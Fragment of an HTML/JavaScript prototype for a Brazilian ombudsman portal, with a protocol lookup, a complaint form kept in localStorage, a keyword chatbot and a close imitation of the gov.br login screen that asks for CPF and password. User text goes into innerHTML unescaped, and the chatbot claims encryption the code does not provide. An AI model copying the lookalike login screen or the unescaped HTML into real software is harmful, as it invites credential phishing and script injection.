                    <button onclick="removeAttachment('${key}')" class="text-red-500 hover:text-red-700 p-1" title="Remover"><svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"></path></svg></button>
                </div>
            `).join('');
        }

        // ========== CONSULTA DE PROTOCOLO ==========
        function searchProtocol() {
            const input = document.getElementById('searchProtocolInput');
            const resultDiv = document.getElementById('searchResult');
            const protocol = input.value.trim().toUpperCase();

            if (!protocol) {
                alert('Por favor, digite um n√∫mero de protocolo.');
                return;
            }

            resultDiv.classList.remove('hidden');
            resultDiv.innerHTML = '<div class="flex items-center gap-2 text-slate-500 font-bold"><div class="animate-spin w-5 h-5 border-2 border-[#004182] border-t-transparent rounded-full"></div> Buscando informa√ß√µes...</div>';

            setTimeout(() => {
                // Busca no "banco de dados" simulado local
                const db = JSON.parse(localStorage.getItem('manifestationsDB') || '[]');
                const found = db.find(m => m.protocol === protocol);

                if (found) {
                    // Calcular prazo estimado
                    let createdDate;
                    if (found.timestamp) {
                        createdDate = new Date(found.timestamp);
                    } else {
                        // Fallback para compatibilidade com dados antigos
                        const parts = found.data.split('/');
                        createdDate = new Date(parts[2], parts[1] - 1, parts[0]);
                    }

                    const deadlineDate = new Date(createdDate);
                    deadlineDate.setDate(deadlineDate.getDate() + 30); // 30 dias de prazo
                    
                    const daysRemaining = Math.ceil((deadlineDate - new Date()) / (1000 * 60 * 60 * 24));
                    const deadlineText = daysRemaining > 0 ? `${daysRemaining} dias restantes` : (daysRemaining === 0 ? 'Vence hoje' : 'Prazo vencido');

                    resultDiv.innerHTML = `
                        <div class="space-y-4">
                            <div class="flex justify-between items-start border-b border-slate-200 pb-4">
                                <div>
                                    <span class="text-xs font-bold text-slate-500 uppercase">Protocolo</span>
                                    <p class="text-xl font-black text-[#004182] font-mono">${found.protocol}</p>
                                </div>
                                <div class="text-right">
                                    <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-bold ${found.status === 'Em An√°lise' ? 'bg-yellow-100 text-yellow-700' : 'bg-green-100 text-green-700'}">
                                        <span class="w-2 h-2 rounded-full ${found.status === 'Em An√°lise' ? 'bg-yellow-400' : 'bg-green-400'} animate-pulse"></span>
                                        ${found.status}
                                    </span>
                                </div>
                            </div>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div><span class="text-xs font-bold text-slate-500 uppercase">Data Abertura</span><p class="font-bold text-slate-800">${found.data}</p></div>
                                <div><span class="text-xs font-bold text-slate-500 uppercase">Previs√£o Conclus√£o</span><p class="font-bold text-slate-800">${deadlineDate.toLocaleDateString('pt-BR')} <span class="text-xs font-normal text-[#004182]">(${deadlineText})</span></p></div>
                                <div class="md:col-span-2"><span class="text-xs font-bold text-slate-500 uppercase">Assunto</span><p class="font-bold text-slate-800">${found.assunto}</p></div>
                                <div class="md:col-span-2"><span class="text-xs font-bold text-slate-500 uppercase">Status Atual</span><p class="text-sm text-slate-600 bg-white p-3 rounded-lg border border-slate-100 mt-1 font-medium">üìã Sua manifesta√ß√£o foi recebida e encaminhada para a √°rea t√©cnica. A an√°lise preliminar est√° em andamento.</p></div>
                            </div>
                        </div>
                    `;
                } else {
                    resultDiv.innerHTML = `
                        <div class="text-center py-4">
                            <div class="text-red-500 font-bold mb-1">Protocolo n√£o encontrado</div>
                            <p class="text-sm text-slate-600">Verifique se o n√∫mero foi digitado corretamente.</p>
                        </div>
                    `;
                }
            }, 800);
        }

        async function handleFormSubmit(e) {
            e.preventDefault();

            const tipo = document.getElementById('tipo').value;
            const assunto = document.getElementById('assunto').value;
            const descricao = document.getElementById('descricao').value;
            const isAnonimo = document.getElementById('anonimo').checked;
            const lgpdConsent = document.getElementById('lgpdConsent').checked;

            if (!tipo || !assunto || !descricao || !lgpdConsent) {
                showError('Por favor, preencha todos os campos obrigat√≥rios e aceite os termos LGPD.');
                return;
            }

            if (descricao.length < 20) {
                showError('A descri√ß√£o deve ter no m√≠nimo 20 caracteres.');
                return;
            }

            const protocol = 'DF-' + new Date().getFullYear() + '-' + Math.floor(100000 + Math.random() * 900000);

            const manifestation = {
                protocol,
                tipo,
                assunto,
                descricao: descricao.substring(0, 60) + '...',
                data: new Date().toLocaleDateString('pt-BR'),
                status: 'Em An√°lise',
                timestamp: new Date().getTime()
            };

            // Salvar no "Banco de Dados" simulado (para busca p√∫blica)
            const db = JSON.parse(localStorage.getItem('manifestationsDB') || '[]');
            db.push(manifestation);
            localStorage.setItem('manifestationsDB', JSON.stringify(db));

            // Salvar no Perfil do Usu√°rio (se logado)
            if (!isAnonimo && isLoggedIn) {
                userManifestations.push(manifestation);
                localStorage.setItem('userManifestations', JSON.stringify(userManifestations));
            }

            // Mostrar sucesso
            document.getElementById('manifestForm').classList.add('hidden');
            document.getElementById('successState').classList.remove('hidden');
            document.getElementById('protocolNumber').textContent = protocol;
            lucide.createIcons();

            appendChatMessage(`‚úÖ Manifesta√ß√£o protocolada com sucesso! Seu n√∫mero √©: ${protocol}`);

            if (!isAnonimo) {
                setTimeout(() => {
                    updateTrackingPanel();
                }, 500);
            }
        }

        function resetForm() {
            document.getElementById('manifestForm').classList.remove('hidden');
            document.getElementById('successState').classList.add('hidden');
            document.getElementById('manifestForm').reset();
            document.getElementById('identificationFields').classList.add('hidden');
            document.getElementById('fileStatus').classList.add('hidden');
            document.getElementById('errorAlert').classList.add('hidden');
            attachedFiles = {};
            document.getElementById('fileStatus').innerHTML = '';
            lucide.createIcons();
        }

        function showError(message) {
            const alert = document.getElementById('errorAlert');
            alert.textContent = message;
            alert.classList.remove('hidden');
            alert.classList.add('flex');
            setTimeout(() => {
                alert.classList.add('hidden');
                alert.classList.remove('flex');
            }, 5000);
        }

        // ========== PAINEL DE RASTREAMENTO ==========
        function updateTrackingPanel() {
            const list = document.getElementById('manifestList');
            const panel = document.getElementById('trackingPanel');
            
            if (userManifestations.length > 0 && isLoggedIn) {
                panel.classList.remove('hidden');
                list.innerHTML = userManifestations.map((m, idx) => `
                    <div class="bg-white p-5 rounded-2xl border border-slate-100 shadow-sm hover:shadow-md transition-all hover:border-[#004182]">
                        <div class="flex justify-between items-start mb-3">
                            <div class="flex-1">
                                <span class="text-[10px] font-black uppercase text-white bg-[#004182] px-3 py-1 rounded-full inline-block mb-2">
                                    ${m.tipo.toUpperCase()}
                                </span>
                                <p class="font-bold text-slate-800 text-base mt-1">${m.assunto}</p>
                                <p class="text-xs text-slate-500 mt-1">${m.data}</p>
                            </div>
                            <div class="text-right ml-4">
                                <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[10px] font-bold whitespace-nowrap
                                    ${m.status === 'Em An√°lise' ? 'bg-yellow-100 text-yellow-700' : 
                                      m.status === 'Respondida' ? 'bg-green-100 text-green-700' : 'bg-blue-100 text-blue-700'}">
                                    <span class="w-1.5 h-1.5 rounded-full ${m.status === 'Em An√°lise' ? 'bg-yellow-400' : 'bg-green-400'} animate-pulse"></span>
                                    ${m.status}
                                </span>
                            </div>
                        </div>
                        <p class="text-sm text-slate-600 font-mono bg-slate-50 p-2 rounded border border-slate-100">
                            üìã ${m.protocol}
                        </p>
                    </div>
                `).join('');
                lucide.createIcons();
            }
        }

        function scrollToTrackingPanel() {
            const panel = document.getElementById('trackingPanel');
            if (!panel.classList.contains('hidden')) {
                setTimeout(() => {
                    panel.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }, 300);
            }
        }

        // ========== CHAT IZA ==========
        function toggleIza() {
            const chat = document.getElementById('izaChat');
            const btn = document.getElementById('izaButton');
            chat.classList.toggle('active');
            btn.textContent = chat.classList.contains('active') ? '‚úñÔ∏è' : 'ü§ñ';
            if (chat.classList.contains('active')) {
                btn.innerHTML = '<svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"></path></svg>';
            } else {
                btn.innerHTML = '<img src="https://ouvidoria.df.gov.br/wp-content/uploads/2022/12/IZA_Robo_CGDF_Prancheta_1-1.png" alt="IZA" class="w-full h-full object-cover rounded-xl">';
            }
        }

        function handleChatKeypress(e) {
            if (e.key === 'Enter') {
                sendChatMessage();
            }
        }

        // Base de Conhecimento do Chat
        const chatKnowledge = {
            keywords: {
                'den√∫ncia': 'Para fazer uma den√∫ncia, preencha o formul√°rio principal selecionando o tipo "Den√∫ncia". Voc√™ pode anexar provas (fotos/v√≠deos) e optar pelo anonimato.',
                'denuncia': 'Para fazer uma den√∫ncia, preencha o formul√°rio principal selecionando o tipo "Den√∫ncia". Voc√™ pode anexar provas (fotos/v√≠deos) e optar pelo anonimato.',
                'prazo': 'O prazo legal √© de 30 dias, prorrog√°vel por mais 30. Nossa m√©dia atual de resposta √© de 5 dias √∫teis.',
                'tempo': 'O prazo legal √© de 30 dias, prorrog√°vel por mais 30. Nossa m√©dia atual de resposta √© de 5 dias √∫teis.',
                'acompanhar': 'Voc√™ pode acompanhar pelo painel "Minhas Manifesta√ß√µes" (se estiver logado) ou aguardar as notifica√ß√µes por e-mail com seu n√∫mero de protocolo.',
                'protocolo': 'O n√∫mero do protocolo √© gerado automaticamente ap√≥s o envio. Guarde-o para consultas futuras.',
                'an√¥nimo': 'Sim! Garantimos sigilo total. Basta marcar a op√ß√£o "Registrar como an√¥nimo" no formul√°rio.',
                'anonimo': 'Sim! Garantimos sigilo total. Basta marcar a op√ß√£o "Registrar como an√¥nimo" no formul√°rio.',
                'seguro': 'Sim, seguimos a LGPD rigorosamente. Seus dados s√£o criptografados e acess√≠veis apenas pelos auditores respons√°veis.',
                'ajuda': 'Estou aqui para ajudar! Voc√™ pode perguntar sobre como denunciar, prazos, acompanhamento ou seguran√ßa.'
            },
            default: 'Ainda estou aprendendo sobre isso. Tente selecionar uma das op√ß√µes abaixo ou reformule sua pergunta. Voc√™ tamb√©m pode ligar para o 162.'
        };

        function sendChatMessage(text = null) {
            const input = document.getElementById('chatInput');
            const message = text || input.value.trim();
            if (!message) return;

            if (!text) input.value = '';

            appendChatMessage(message, false);

            setTimeout(() => {
                let response = chatKnowledge.default;
                const lowerMsg = message.toLowerCase();
                
                // Busca simples por palavra-chave
                for (const [key, value] of Object.entries(chatKnowledge.keywords)) {
                    if (lowerMsg.includes(key)) {
                        response = value;
                        break;
                    }
                }

                appendChatMessage(response, true);
                
                // Se n√£o entendeu, mostra op√ß√µes novamente
                if (response === chatKnowledge.default) {
                    appendOptions();
                }
            }, 600);
        }

        function appendChatMessage(text, isBot = true) {
            const content = document.getElementById('chatContent');
            const msg = document.createElement('div');
            msg.className = `flex ${isBot ? 'justify-start' : 'justify-end'} animate-slide-up`;
            
            if (isBot) {
                msg.innerHTML = `
                    <div class="bg-white p-3 rounded-2xl rounded-tl-none shadow-sm border border-slate-100 max-w-[85%]">
                        <p class="text-sm font-medium">${text}</p>
                    </div>
                `;
            } else {
                msg.innerHTML = `
                    <div class="bg-[#004182] text-white p-3 rounded-2xl rounded-tr-none shadow-sm max-w-[85%]">
                        <p class="text-sm font-medium">${text}</p>
                    </div>
                `;
            }
            
            content.appendChild(msg);
            content.scrollTop = content.scrollHeight;
        }

        function appendOptions() {
            const content = document.getElementById('chatContent');
            const div = document.createElement('div');
            div.className = 'flex flex-col gap-2 animate-slide-up mt-2';
            div.innerHTML = `
                <p class="text-xs text-slate-500 font-bold ml-2">Tente uma destas op√ß√µes:</p>
                <button onclick="sendChatMessage('Como fazer uma den√∫ncia?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">üö® Como fazer uma den√∫ncia?</button>
                <button onclick="sendChatMessage('Qual o prazo?')" class="text-left bg-white p-3 rounded-xl border border-slate-200 text-sm text-[#004182] font-bold hover:bg-blue-50 transition-colors shadow-sm">‚è≥ Qual o prazo?</button>
            `;
            content.appendChild(div);
            content.scrollTop = content.scrollHeight;
        }

        // ========== MODAL PERFIL ==========
        function openProfileModal() {
            if (!isLoggedIn) {
                startGovBrFlow();
                return;
            }
            document.getElementById('profileModal').classList.add('active');
            
            // Carregar dados
            document.getElementById('profileNameInput').value = userProfile.name;
            document.getElementById('profileEmailInput').value = userProfile.email;
            document.getElementById('manifestCount').textContent = userManifestations.length;
        }

        function enableEdit(inputId) {
            const input = document.getElementById(inputId);
            input.disabled = false;
            input.focus();
            input.addEventListener('blur', () => {
                input.disabled = true;
                // Salvar altera√ß√µes
                if (inputId === 'profileNameInput') userProfile.name = input.value;
                if (inputId === 'profileEmailInput') userProfile.email = input.value;
                localStorage.setItem('userProfile', JSON.stringify(userProfile));
                showLoggedInUser(); // Atualizar header
            }, { once: true });
        }

        function closeProfileModal() {
            document.getElementById('profileModal').classList.remove('active');
        }

        document.getElementById('profileModal').addEventListener('click', function(e) {
            if (e.target === this) closeProfileModal();
        });

        // ========== SERVICE WORKER (PWA/OFFLINE) ==========
        if ('serviceWorker' in navigator) {
            const swCode = `
                const CACHE = 'ouvidoria-v1';
                self.addEventListener('install', e => {
                    e.waitUntil(caches.open(CACHE).then(c => c.addAll(['/'])));
                    self.skipWaiting();
                });
                self.addEventListener('activate', e => {
                    e.waitUntil(clients.claim());
                });
                self.addEventListener('fetch', e => {
                    e.respondWith(
                        fetch(e.request)
                            .then(r => {
                                if (e.request.method === 'GET') {
                                    const cache = caches.open(CACHE);
                                    cache.then(c => c.put(e.request, r.clone()));
                                }
                                return r;
                            })
                            .catch(() => caches.match(e.request))
                    );
                });
            `;
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl).then(() => {
                console.log('‚úÖ PWA Ativo - Funciona Offline');
            }).catch(err => console.log('‚ÑπÔ∏è SW n√£o suportado:', err));
        }
    </script>

    <!-- VLibras Oficial -->
    <div vw class="enabled">
        <div vw-access-button class="active"></div>
        <div vw-plugin-wrapper>
            <div class="vw-plugin-top-wrapper"></div>
        </div>
    </div>
    <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
    <script>
        new window.VLibras.Widget('https://vlibras.gov.br/app');
    </script>

    <!-- TELA DE LOGIN GOV.BR (SIMULA√á√ÉO FIEL) -->
    <div id="govbr-login-screen">
        <div class="govbr-header">
            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="gov.br" class="govbr-logo" onclick="closeGovBrLogin()" title="Voltar para o in√≠cio">
        </div>
        
        <div class="govbr-main">
            <div class="govbr-content-wrapper">
                <div class="govbr-side-image">
                    <img id="govbr-side-img" src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg" alt="Conta gov.br" style="width: 100%; border-radius: 8px;">
                </div>

                <div class="govbr-card">
                <!-- Passo 1: CPF -->
                <div id="govbr-step-1">
                    <h2 class="govbr-title">Identifique-se no gov.br</h2>
                    <p class="govbr-desc">O n√∫mero do CPF √© obrigat√≥rio para criar ou acessar sua conta gov.br.</p>
                    
                    <label class="govbr-label">N√∫mero do CPF</label>
                    <input type="tel" id="govbr-cpf" class="govbr-input" placeholder="Digite seu CPF" oninput="formatCPF(this)">
                    
                    <button onclick="handleGovBrStep1()" class="govbr-btn">Continuar</button>

                    <div class="govbr-divider">Outras op√ß√µes de identifica√ß√£o:</div>
                    
                    <button class="govbr-options-btn" onclick="simulateExternalLogin('Banco')">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                        Login com seu banco
                        <span class="govbr-badge-prata">Sua conta ser√° prata</span>
                    </button>
                    
                    <button class="govbr-options-btn" onclick="simulateExternalLogin('QR Code')">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3h6v6H3z"/><path d="M15 3h6v6h-6z"/><path d="M3 15h6v6H3z"/><path d="M15 15h6v6h-6z"/><path d="M10 3h4v4h-4z"/><path d="M3 10h4v4H3z"/><path d="M10 10h4v4h-4z"/></svg>
                        Login com QR code
                    </button>

                    <button class="govbr-options-btn" onclick="simulateExternalLogin('Certificado Digital')">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.91 8.84 8.56 2.23a1.93 1.93 0 0 0-1.81 0L3.1 4.13a2.12 2.12 0 0 0-.05 3.69l12.22 6.93a2 2 0 0 0 1.94 0L21 12.51a2.12 2.12 0 0 0-.09-3.67Z"></path></svg>
                        Seu certificado digital
                    </button>

                    <button class="govbr-options-btn" onclick="simulateExternalLogin('Certificado em Nuvem')">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.5 19c0-1.7-1.3-3-3-3h-1.1c-.1-2.3-1.9-4-4.2-4-2.1 0-3.9 1.5-4.2 3.5C3.1 15.9 2 17.3 2 19c0 1.7 1.3 3 3 3h12.5c1.7 0 3-1.3 3-3z"></path></svg>
                        Seu certificado digital em nuvem
                    </button>

                    <div class="govbr-help-section">
                        <a href="#" onclick="alert('Redirecionando para a p√°gina de ajuda...')" class="govbr-link" style="display: block; margin-bottom: 1rem;">Est√° com d√∫vidas e precisa de ajuda?</a>
                        <a href="#" onclick="alert('Exibindo Termos de Uso...')" class="govbr-link" style="font-size: 0.8rem; color: #666;">Termo de Uso e Aviso de Privacidade</a>
                    </div>
                </div>

                <!-- Passo 2: Senha -->
                <div id="govbr-step-2" class="hidden">
                    <div class="flex items-center gap-2 mb-6">
                        <button onclick="startGovBrFlow()" class="text-[#1351B4]">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                        </button>
                        <div class="flex flex-col">
                            <span class="text-xs text-gray-500 uppercase font-bold">CPF</span>
                            <span id="govbr-cpf-display" class="font-bold text-gray-700"></span>
                        </div>
                    </div>

                    <h2 class="govbr-title">Digite sua senha</h2>
                    
                    <label class="govbr-label">Senha</label>
                    <div class="relative">
                        <input type="password" id="govbr-password" class="govbr-input" placeholder="Digite sua senha">
                        <button class="absolute right-3 top-3 text-[#1351B4]" onclick="const i = document.getElementById('govbr-password'); i.type = i.type === 'password' ? 'text' : 'password'">
                            üëÅÔ∏è
                        </button>
                    </div>

                    <div class="flex gap-4">
                        <button onclick="closeGovBrLogin()" class="govbr-btn" style="background-color: white; color: #1351B4; border: 1px solid #1351B4;">Cancelar</button>
                        <button onclick="handleGovBrLogin()" class="govbr-btn">Entrar</button>
                    </div>
                    
                    <div class="text-center mt-6">
                        <a href="#" class="govbr-link">Esqueci minha senha</a>
                    </div>
                </div>
            </div>
            </div>
        </div>
    </div>

</body>
</html>
